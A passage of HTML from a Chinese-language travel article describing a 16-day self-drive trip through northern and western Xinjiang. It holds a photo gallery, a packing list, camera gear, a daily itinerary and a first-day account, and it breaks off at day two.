class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/54c16214b68597f1d43f1934b2458561\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>可可托海风景区</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/0086c9c8f175edba8184d75a5dd0849b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>三号矿坑</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/aa8ce8151809da42f38f5de21011b789\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>可可苏里花海</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/440465d5b4083f3eca2c8fcf7ed6db49\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/2aadf28dfa1580844b90395b6bda77b0\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>喀纳斯</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/7e8b8406ac5de84b3710f96627ecb682\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>喀纳斯</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/25d587c83ff0a28419ae441cbdcd925c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>喀纳斯</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/7922cbb0328a7e511885cb8efb20193c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>喀纳斯</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/270c44755dd7a2cd3fc6f7b814bbce81\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>喀纳斯</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/c1d4725dfb35e72d7959edd148150176\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>喀纳斯</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/e57a8f38bb66b445cbca35d914150120\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>禾木</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/e39e52c15700d9d14d23d9e3b911d4a5\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>禾木</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/7ff491d664b97a3597094476d012b4ff\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>禾木</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/7c8b9793055f9fc02012814b35dd7d39\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>五彩滩</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/3e6bfeb46fecf1645ada4348dee3fef1\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>五彩滩</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/bbf1ebae9388905f733f941eb017b61e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>赛里木湖</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/96780856694215e49b60f70166f425fa\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>赛里木湖</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/365e49fc73ef13c3538394e821943bcb\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>赛里木湖</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/aa61980cb319c0af59f2e69056862773\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>果子沟大桥</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/64f126fdb31a47f853623b1c9f38e7a0\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>果子沟大桥</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/7bfe9a751cf11b8fbef9fff6451580a8\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>果子沟大桥</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/1c6595c68587f74495ccd1aa10c39426\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>果子沟大桥</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/9aec31c3bb8435947e0253e797e2de00\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>果子沟大桥</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/070fd1153c8a038e7f8bd73d4aadd14c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>果子沟大桥</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/df9c3981fad72063f108ef4ee986ca8c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>伊昭公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/558ab623218e5a27aa2e1d2ac29ccf88\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>伊昭公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/a23dc397b50c0c5401fd3fab4b27f37f\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>伊昭公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/a96d22a4701d96c476eaff6fe370b359\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>伊昭公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/02640a110881d66589de05abec504504\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>伊昭公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/be9fdfa5774e2dc0726dcf6562c1d21e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>伊昭公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/46c41cd4d3e4c1eea97091797b51b35e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>伊昭公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/27c82652aa370d4b018555d3c2575fdb\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>布尔津</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/dccf3ee53d5daf70159d55d21a8a8145\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>昭苏</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/4e1ee041e988b7039ba02f3b6f16e852\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>夏塔旅游区</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/25f551ce4ddc4b17495d2fbfcaefce6e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>夏塔旅游区</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/89cde5cfe2717cd811628898a6347f7c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>夏塔旅游区</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/4a53c26fa79e8a013e965fd0bccb801c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>夏塔旅游区</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/af15587f8245f11c3adf8ef02a2c0878\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>夏塔旅游区</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/9d1359f27eafeb49adee76333a278cf2\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>夏塔旅游区</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b31bc79e7ab940049791ff795cefa33f\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>夏塔旅游区</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/4a0ce793b42254dda1c6a01afd1d252e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>琼库什台村</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/223cc3c881f130a7f5208421a289bf89\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>琼库什台村</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/10a1a29f091bfb84b3f6b0a95e362bfb\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>琼库什台村</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/52427ceff2fb5b9100ee31fba297bcca\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>琼库什台村</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/5d6172414b2e26987ed7b82837e49d5e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>琼库什台村</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/784a7c71e99d8e4419f582faf703788c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>喀拉峻大草原</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/bf617825e0aaec8247b97e2a7910546e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>喀拉峻大草原</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8ee8acae65238f0d2609e90c58336124\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>喀拉峻大草原</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/102420eaeab4537c8372886aca3d1795\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>喀拉峻大草原</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b3a0ca5d12e4608e355d8e9afed3e377\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>那拉提草原</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/66382ebe2ce6294c1d3737d3812ac558\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>那拉提草原</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/9840a9b3a2843cb0115ad4fb667a140a\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>那拉提草原</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/ee1f728a2dec17e33eb0fcb989e2b67d\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>那拉提草原</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/76e75c03c32ceb47565323d5650eef15\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>巴音布鲁克草原</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/d75bb2b6f6c4d5d69b2f6c10ff061d99\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>巴音布鲁克草原</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/c1a422030fa03ba8df54904beddaff14\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>巴音布鲁克草原</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/a146956bce28d56be497b0ab7ba169ca\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>巴音布鲁克草原</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/af7c1a5df90851b7e604c01495dc3020\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独库公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/ebbecf620eab8face9bed80511f4dc4a\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独库公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/fb488875ede4fb99d55e331771f7e0c0\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独库公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/98dce7652e9ed0b8ce38bf09e4b3c871\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独库公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/6e74d62655b3fa6fdfdc52cfde076fa0\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独库公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/d91068516ca930ba9c74487833b0d15e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独库公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/2e8f6ad326aca4e27bc5b1167b1ba376\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独库公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/6e1387c3bc90be7c1fd4df59d568e825\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独库公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8bd1a60284b426ff48ae5fc4c01fa75e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独库公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/a90d714c88666a2200dd7442cc7d6b3c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独库公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/6c4535f7454aa51891a5868db9994567\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独库公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/1b57f41e650d41e6e8c381b63daa1746\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独库公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/47e96d48cde2d3eb1988db48b3af0d91\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独库公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/9f5807205aca8b890a6e71f269ed26c4\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独库公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/1c38facae93eb19775566fdb1a9eecac\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独库公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/44be070a70d6354f47abe0fae940d8c6\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独库公路</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/5926eddd02d36f0b1d86428a7e9d370d\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"><figcaption>独山子大峡谷</figcaption></figure><h2>关于 16 天的自驾行</h2>\n<p>作为两个不经常开车的人，虽然这次在新疆 95% 以上都是铺装路面，不过 16 天的连续自驾，对我们两个人来说仍是一个不小的挑战。</p>\n<p>16 天总计开车 4000 公里，山路也有 1000 多公里。停车晚上可以停到酒店，在景区也都有停车场，还算方便。路上曾遇到过小的泥石流差点被迫返程，遇到过几次大雨冰雹天窗漏雨，也在山路上发生过剐蹭，好的坏的各种经历满满。</p>\n<p>不过跑的山路风景都很不错，包括去琼库什台村路上绝美风景的山路， 大名 鼎鼎刚开通的伊昭公路、 独库公路 ，如果景区人多，完全可以找小众景点+山路，景色不输景区门票也便宜。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/ec79777f5189347e50eab1b29a73df19\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><p>整体来看， 新疆 自驾的难度没想象中那么大。一方面车的要求没那么高，最好是 SUV，不过轿车也没问题。另一方面如果像我们一样驾驶技术一般，也基本只有一个驾驶员的，可以慢一些。尤其是走山路的时候，老司机也建议不要随意超车，控制速度。而且在城市里更是要注意速度，时不时有限速 20/30 的标志出来。</p>\n<p>关于是否有必要自驾，如果条件允许，非常建议自驾，相比包车价格低一些，相比报团要自由很多。而且相比景区，这 16 天有一半多绝美的风景，都在路上的转角处。如果自驾的话，人多一点会好一些，3 至 4 个最佳，一方面有个开车拍照的帮手，一方面也能均摊下费用哈哈。</p>\n<h2>常用物品及出行清单</h2>\n<ul>\n<li>⭐️气温： 北疆 17℃ 至 35℃，变化比较大， 新疆 夏季基本每天晚上 9 到 10 点才天黑，早上 7 到 8 点开始天亮，白昼时间长达 18 个小时。</li>\n<li>⭐️天气：7月份晴天和阴天都不少，可以提前看天气情况安排行程，避开雨季。如果要徒步，因为山间的天气变化快，建议包里装上冲锋衣。</li>\n<li>⭐️证件：身份证和驾照必须要带好，不只是住宿需要，很多检查站都会查。尤其是加油的时候，车上只留驾驶员，进入加油站和加油都需要刷身份证。</li>\n<li>⭐️垃圾袋：主要用途是装自己的衣服和垃圾</li>\n<li>⭐️药品：晕车药、肠胃药、牛黄解毒片、 云南白药、风油精。这次两个人都有拉肚子的经历，肠胃药很重要。</li>\n<li>⭐️护肤：防晒霜、唇膏、护手霜，以及补水保湿乳液。强烈推荐帽子+墨镜+魔术头巾+冰袖的搭配。</li>\n<li>⭐️现金：1500 元（其实没怎么用到，全程刷微信，不过联通的信号不好，移动信号好很多）</li>\n<li>⭐️其它：登山杖、雨伞、保温杯（气温变化快）等我在印象笔记中保存有一个物品清单，每次出行前都会一一核对，把需要带的内容准备好，统一打包。这个清单包括了衣物、洗漱用品、常用药品、拍摄器材、等常用物品，拿来作为基础的参考还是很实用的。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/90b8ce01e9c03847f8b8b440286b4dad\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><p>因为是 16 天的自驾，考虑到 新疆 当地的天气和温度，且住宿条件不一定都很好。所以准备的衣物比平时更多一些，老婆也买了很多一次性的袜子内裤、床单被罩以及毛巾等。冲锋衣、冰袖、防蚊虫的药品也需要备上。总共拿有两个大行李箱（24 寸+21 寸），一个大背包，一个大挎包，行李很重，如果只是男生出行，东西能少很多，哈哈。</p>\n<h2>摄影装备</h2>\n<ul>\n<li>⭐️大疆 OM4 手机云台，两台手机</li>\n<li>⭐️佳能 EOS RP，镜头：35 mm / 17-40 mm / 70-200 mm，思锐三脚架</li>\n<li>⭐️配件：ND 滤镜 | CPL 滤镜 | 电池 4 块+充电套装 | 内存卡两个（64GB 和 32GB）+移动硬盘+电脑</li>\n<li>⭐️软件：Lightroom | Photoshop | 相机直出（尽可能还原现场眼睛捕捉到的色彩、光线和质感）实际上用的最多的是 RP+70-200 mm。</li>\n</ul>\n<p>如果打算自驾新疆带专业一些的拍摄设备，无人机和 70-200 镜头很实用。当然也要考虑到负重情况，当我背着三脚架、保温杯、雨伞和一堆器材在 2000 米以 上海 拔徒步的时候，滋味很酸爽。以后背负无人机的话，相机的镜头可能只考虑 24-105 F4了。</p>\n<h2>16 天行程安排总览</h2>\n<p>16 天的行程基本上涵盖了新疆北线和西线的主要景点，因为这次打算都逛一遍，后面再来的时候可以深度游。所以行程比较赶，可以再精简一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/89ed6af88fba066a68c09db6ab9923c8\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><ul>\n<li>第 1 天： 北京 — 乌鲁木齐 — 可可托海 镇（住宿）</li>\n<li>第 2 天： 可可托海 镇— 可可托海 — 布尔津 （住宿）</li>\n<li>第 3 至 4 天： 布尔津 — 喀纳斯 （住宿）</li>\n<li>第 4 至 5 天： 禾木 （住宿）— 布尔津 （住宿）</li>\n<li>第 6 天： 布尔津 —魔鬼城— 精河 （住宿）</li>\n<li>第 7 天： 精河 —赛里木湖—果子沟（住宿）</li>\n<li>第 8 天：果子沟—解忧公主薰衣草园— 伊宁 —伊昭公路— 昭苏 （住宿）</li>\n<li>第 9 天： 昭苏 —夏塔景区— 特克斯 （住宿）</li>\n<li>第 10 天： 特克斯 -琼库什台-喀拉峻大草原（住宿）</li>\n<li>第 11 天：喀拉峻大草原— 特克斯 （住宿）</li>\n<li>第 12 至 13 天：那拉提（住宿）</li>\n<li>第 14 天：那拉提— 独库公路 —巴音布鲁克草原（住宿）</li>\n<li>第 15 天：巴音布鲁克草原— 独库公路 — 独山子 大峡谷— 奎屯 （住宿）</li>\n<li>第 16 天： 奎屯 — 乌鲁木齐 — 北京</li>\n</ul>\n<h2>第 1 天：北京-乌鲁木齐—可可托海镇（住宿）</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/4dc6e2fa049a40d9faed4af7aeca06a4\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/e4f822cee724ea2d8900779bb28f4ab8\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><ul>\n<li>⭐️ 景点：无</li>\n<li>⭐️ 行程： 早上从北京赶早班机，11点到乌鲁木齐 ，然后去神州租车取车，购买了水和零食和其他日用品之后，吃个午饭，就开始往富蕴赶路。一路上车很少，戈壁居多有点荒凉，晚上赶到富蕴县吃了个晚饭。去住宿的地方需要走了一段山路，路经可可苏里花海的时候遇到夕阳非常美，之后的小村落也很漂亮，晚上住在 可可托海 镇的民宿（山里面蚊虫很多）。</li>\n<li>⭐️ 门票：无</li>\n<li>⭐️ 住宿地点：富蕴金格泉民宿（蚊虫较多，离景区近）</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b4129243800f181e668a6a4376b34777\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/57ed48e6f9e449932f073d7125813583\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/95c5fc59e14324c2ce50e45c9138c8be\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/38d482aa8b6c2396277e1a9f6f23021f\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/bb7dc16663fbf228922ae5ec04e7d891\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/18d34687769f750cbb83a04693f4a4c2\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/2fbf80fba5eb770fba5ab13c451f0bbd\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/1459ac90bea4c7e33d6859cb62403346\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/3ca2ca7ff4f30799f3250d6485b78916\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/c5fef15e1f43070ce8e67edd5dc0c8ae\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/4fc4c95a1c44e3c2e572b8af8fdc8dc8\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/74a9ae07d67c15c931dbd1e764d29c9d\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/41dc36edb25480a7139a7610e719852f\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><h2>第 2 天：可可托海—布尔津 （住宿）</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/a4b0cfa8183ad07fd51c40f3dd8a3cd7\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/047da520c884374c042c7fb4df4478e3\" 